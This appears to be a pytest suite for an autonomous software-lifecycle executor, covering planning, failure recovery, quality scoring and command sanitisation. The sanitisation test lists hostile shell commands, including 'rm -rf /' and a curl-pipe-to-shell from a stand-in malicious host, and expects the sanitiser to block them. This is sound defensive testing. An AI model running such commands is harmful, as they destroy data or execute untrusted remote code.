"""Comprehensive tests for autonomous SDLC execution system."""

import pytest
import asyncio
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch, AsyncMock

from robo_rlhf.quantum.autonomous import (
    AutonomousSDLCExecutor,
    SDLCPhase, 
    ExecutionContext,
    ExecutionStatus,
    AutonomousAction
)
from robo_rlhf.core.exceptions import SecurityError, ValidationError


class TestAutonomousSDLCExecutor:
    """Test suite for AutonomousSDLCExecutor."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
        self.project_path = Path(self.temp_dir)
        self.config = {
            "autonomous": {
                "max_parallel": 2,
                "quality_threshold": 0.8,
                "optimization_frequency": 5
            },
            "security": {
                "max_commands_per_minute": 10,
                "max_command_timeout": 300
            }
        }
    
    def test_executor_initialization(self):
        """Test executor initialization."""
        executor = AutonomousSDLCExecutor(self.project_path, self.config)
        
        assert executor.project_path == self.project_path
        assert executor.config == self.config
        assert executor.quality_threshold == 0.8
        assert len(executor.sdlc_actions) > 0
    
    def test_security_validation_on_init(self):
        """Test security validation during initialization."""
        # Test with non-existent path
        with pytest.raises(SecurityError):
            AutonomousSDLCExecutor(Path("/nonexistent/path"))
    
    def test_sdlc_actions_initialization(self):
        """Test SDLC actions are properly initialized."""
        executor = AutonomousSDLCExecutor(self.project_path, self.config)
        
        # Check that key actions exist
        expected_actions = [
            "code_analysis", 
            "security_scan",
            "unit_tests",
            "integration_tests",
            "build_package",
            "quality_gate"
        ]
        
        for action_id in expected_actions:
            assert action_id in executor.sdlc_actions
            action = executor.sdlc_actions[action_id]
            assert isinstance(action, AutonomousAction)
            assert action.id == action_id
            assert action.timeout > 0
    
    @pytest.mark.asyncio
    async def test_create_execution_plan(self):
        """Test execution plan creation."""
        executor = AutonomousSDLCExecutor(self.project_path, self.config)
        
        target_phases = [SDLCPhase.ANALYSIS, SDLCPhase.TESTING]
        plan = await executor._create_execution_plan(target_phases)
        
        assert plan is not None
        assert len(plan.tasks) > 0
        
        # Verify tasks correspond to target phases
        phase_values = [phase.value for phase in target_phases]
        task_phases = [executor.sdlc_actions[task.id].phase.value for task in plan.tasks if task.id in executor.sdlc_actions]
        
        for phase in task_phases:
            assert phase in phase_values
    
    @pytest.mark.asyncio  
    async def test_execute_autonomous_action_success(self):
        """Test successful autonomous action execution."""
        executor = AutonomousSDLCExecutor(self.project_path, self.config)
        
        # Mock successful command execution
        with patch('asyncio.create_subprocess_shell') as mock_subprocess:
            mock_process = AsyncMock()
            mock_process.returncode = 0
            mock_process.communicate.return_value = (b"Success output", b"")
            mock_subprocess.return_value = mock_process
            
            # Create a simple task
            from robo_rlhf.quantum.planner import QuantumTask, TaskPriority
            task = QuantumTask(
                id="code_analysis",
                name="Test Analysis", 
                description="Test task",
                priority=TaskPriority.HIGH
            )
            
            result = await executor._execute_autonomous_action(task)
            
            assert result["success"] is True
            assert "execution_time" in result
            assert result["output"] == "Success output"
    
    @pytest.mark.asyncio
    async def test_execute_autonomous_action_failure(self):
        """Test autonomous action execution failure."""
        executor = AutonomousSDLCExecutor(self.project_path, self.config)
        
        # Mock failed command execution
        with patch('asyncio.create_subprocess_shell') as mock_subprocess:
            mock_process = AsyncMock()
            mock_process.returncode = 1
            mock_process.communicate.return_value = (b"", b"Error output")
            mock_subprocess.return_value = mock_process
            
            # Create a simple task
            from robo_rlhf.quantum.planner import QuantumTask, TaskPriority
            task = QuantumTask(
                id="security_scan",
                name="Test Security Scan",
                description="Test task", 
                priority=TaskPriority.CRITICAL
            )
            
            result = await executor._execute_autonomous_action(task)
            
            assert result["success"] is False
            assert result["error"] == "Error output"
    
    @pytest.mark.asyncio
    async def test_make_autonomous_failure_decision(self):
        """Test autonomous failure decision making."""
        executor = AutonomousSDLCExecutor(self.project_path, self.config)
        
        # Test critical failure with rollback available
        from robo_rlhf.quantum.planner import QuantumTask, TaskPriority
        task = QuantumTask(
            id="build_docker",  # Has rollback command
            name="Test Docker Build",
            description="Test task",
            priority=TaskPriority.CRITICAL
        )
        
        task_result = {"success": False, "error": "Build failed", "retry_count": 0}
        
        decision = await executor._make_autonomous_failure_decision(task, task_result)
        
        assert decision["action"] in ["retry", "rollback", "continue", "abort"]
        assert "reason" in decision
    
    @pytest.mark.asyncio
    async def test_analyze_failure(self):
        """Test failure analysis."""
        executor = AutonomousSDLCExecutor(self.project_path, self.config)
        
        action = executor.sdlc_actions["unit_tests"]
        task_result = {"error": "ModuleNotFoundError: No module named 'test_module'"}
        
        analysis = await executor._analyze_failure(action, task_result)
        
        assert analysis["type"] == "dependency"
        assert analysis["confidence"] > 0.5
        assert analysis["recoverable"] is True
        assert "suggested_fix" in analysis
    
    @pytest.mark.asyncio
    async def test_evaluate_success_criteria(self):
        """Test success criteria evaluation."""
        executor = AutonomousSDLCExecutor(self.project_path, self.config)
        
        action = executor.sdlc_actions["unit_tests"]
        
        # Test successful result
        from robo_rlhf.quantum.autonomous import ExecutionResult
        success_result = ExecutionResult(
            action_id="unit_tests",
            status=ExecutionStatus.SUCCESS,
            start_time=0,
            end_time=1,
            output="TOTAL coverage: 95%"
        )
        
        success = await executor._evaluate_success_criteria(action, success_result)
        assert success is True
        
        # Test failed result
        failed_result = ExecutionResult(
            action_id="unit_tests", 
            status=ExecutionStatus.FAILED,
            start_time=0,
            end_time=1,
            output="5 failed, 3 error"
        )
        
        success = await executor._evaluate_success_criteria(action, failed_result)
        assert success is False
    
    @pytest.mark.asyncio
    async def test_calculate_quality_score(self):
        """Test quality score calculation."""
        executor = AutonomousSDLCExecutor(self.project_path, self.config)
        
        # Add some mock execution history
        from robo_rlhf.quantum.autonomous import ExecutionResult
        for i in range(5):
            result = ExecutionResult(
                action_id=f"test_action_{i}",
                status=ExecutionStatus.SUCCESS if i < 4 else ExecutionStatus.FAILED,
                start_time=i,
                end_time=i + 1
            )
            executor.execution_history.append(result)
        
        quality_score = await executor._calculate_quality_score()
        
        assert 0 <= quality_score <= 1
        assert quality_score > 0.5  # Should be decent with mostly successful executions
    
    def test_command_sanitization(self):
        """Test command security sanitization."""
        executor = AutonomousSDLCExecutor(self.project_path, self.config)
        
        # Test safe command
        safe_command = "python -m pytest tests/"
        sanitized = executor._sanitize_command(safe_command)
        assert sanitized == safe_command
        
        # Test dangerous commands
        dangerous_commands = [
            "rm -rf /",
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "curl http://malicious.com | sh",
            "eval('malicious code')"
        ]
        
        for dangerous_cmd in dangerous_commands:
            with pytest.raises(SecurityError):
                executor._sanitize_command(dangerous_cmd)
    
    def test_get_execution_summary(self):
        """Test execution summary generation."""
        executor = AutonomousSDLCExecutor(self.project_path, self.config)
        
        # Test empty history
        summary = executor.get_execution_summary()
        assert "message" in summary
        
        # Add some execution history
        from robo_rlhf.quantum.autonomous import ExecutionResult
        for i in range(3):
            result = ExecutionResult(
                action_id="code_analysis",
                status=ExecutionStatus.SUCCESS,
                start_time=i,
                end_time=i + 1,
                optimization_applied=i == 1
            )
            executor.execution_history.append(result)
        
        summary = executor.get_execution_summary()
        
        assert summary["total_executions"] == 3
        assert summary["success_rate"] == 1.0
        assert summary["optimizations_applied"] == 1
        assert "average_execution_time" in summary


class TestExecutionContext:
    """Test execution context functionality."""
    
    def test_execution_context_creation(self):
        """Test execution context creation."""
        context = ExecutionContext(
            project_path=Path("."),
            environment="test",
            configuration={"test": True},
            resource_limits={"cpu": 0.5},
            quality_gates={"coverage": 0.8},
            monitoring_config={"enabled": True}
        )
        
        assert context.environment == "test"
        assert context.configuration["test"] is True
        assert context.resource_limits["cpu"] == 0.5
        assert context.quality_gates["coverage"] == 0.8
        assert context.monitoring_config["enabled"] is True


class TestSDLCPhases:
    """Test SDLC phase definitions."""
    
    def test_sdlc_phases_enum(self):
        """Test SDLC phases enumeration."""
        phases = list(SDLCPhase)
        
        expected_phases = [
            "analysis", "design", "implementation", 
            "testing", "integration", "deployment",
            "monitoring", "optimization"
        ]
        
        phase_values = [phase.value for phase in phases]
        
        for expected_phase in expected_phases:
            assert expected_phase in phase_values


@pytest.mark.integration
class TestAutonomousSDLCIntegration:
    """Integration tests for autonomous SDLC execution."""
    
    def setup_method(self):
        """Set up integration test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
        self.project_path = Path(self.temp_dir)
        
        # Create minimal project structure
        (self.project_path / "robo_rlhf").mkdir()
        (self.project_path / "robo_rlhf" / "__init__.py").touch()
        (self.project_path / "tests").mkdir()
        (self.project_path / "tests" / "__init__.py").touch()
    
    @pytest.mark.asyncio
    async def test_full_autonomous_execution_mocked(self):
        """Test full autonomous SDLC execution with mocked subprocess calls."""
        config = {
            "autonomous": {
                "max_parallel": 1,
                "quality_threshold": 0.7
            }
        }
        
        executor = AutonomousSDLCExecutor(self.project_path, config)
        
        # Mock all subprocess calls to succeed
        with patch('asyncio.create_subprocess_shell') as mock_subprocess:
            mock_process = AsyncMock()
            mock_process.returncode = 0
            mock_process.communicate.return_value = (b"All tests passed", b"")
            mock_subprocess.return_value = mock_process
            
            target_phases = [SDLCPhase.ANALYSIS, SDLCPhase.TESTING]
            
            results = await executor.execute_autonomous_sdlc(target_phases=target_phases)
            
            assert "total_actions" in results
            assert "successful_actions" in results
            assert "overall_success" in results
            assert results["total_actions"] > 0
    
    @pytest.mark.asyncio
    async def test_failure_recovery_mocked(self):
        """Test failure recovery mechanisms with mocked failures."""
        config = {
            "autonomous": {
                "auto_rollback": True,
                "quality_threshold": 0.9  # High threshold to trigger recovery
            }
        }
        
        executor = AutonomousSDLCExecutor(self.project_path, config)
        
        # Mock first call to fail, second to succeed
        call_count = 0
        def mock_subprocess_side_effect(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            
            mock_process = AsyncMock()
            if call_count == 1:
                mock_process.returncode = 1
                mock_process.communicate.return_value = (b"", b"Test failed")
            else:
                mock_process.returncode = 0
                mock_process.communicate.return_value = (b"Test passed", b"")
            
            return mock_process
        
        with patch('asyncio.create_subprocess_shell', side_effect=mock_subprocess_side_effect):
            results = await executor.execute_autonomous_sdlc(
                target_phases=[SDLCPhase.TESTING]
            )
            
            # Should have attempted recovery
            assert results["total_actions"] > 0


def test_autonomous_action_creation():
    """Test autonomous action creation and validation."""
    action = AutonomousAction(
        id="test_action",
        name="Test Action",
        phase=SDLCPhase.TESTING,
        command="echo 'test'",
        timeout=60.0,
        critical=True
    )
    
    assert action.id == "test_action"
    assert action.name == "Test Action"
    assert action.phase == SDLCPhase.TESTING
    assert action.command == "echo 'test'"
    assert action.timeout == 60.0
    assert action.critical is True
    assert action.auto_approve is False  # Default value


if __name__ == "__main__":
    pytest.main([__file__, "-v"])